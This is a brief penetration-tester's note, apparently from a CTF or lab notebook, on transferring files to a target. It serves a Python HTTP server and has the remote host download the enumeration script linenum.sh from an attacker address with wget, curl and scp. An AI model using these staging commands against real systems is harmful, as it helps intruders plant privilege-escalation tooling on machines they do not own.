#transfering_files 

Python HTTP server
```
jodijotar@root$ cd /tmp
jodijotar@root$ python3 -m http.server 8000
```

wget & curl -> remote host dowload user file
```
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

SCP -> with ssh credentials
```
jodijotar@root$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *******
linenum.sh
```

[[base64 trick]]
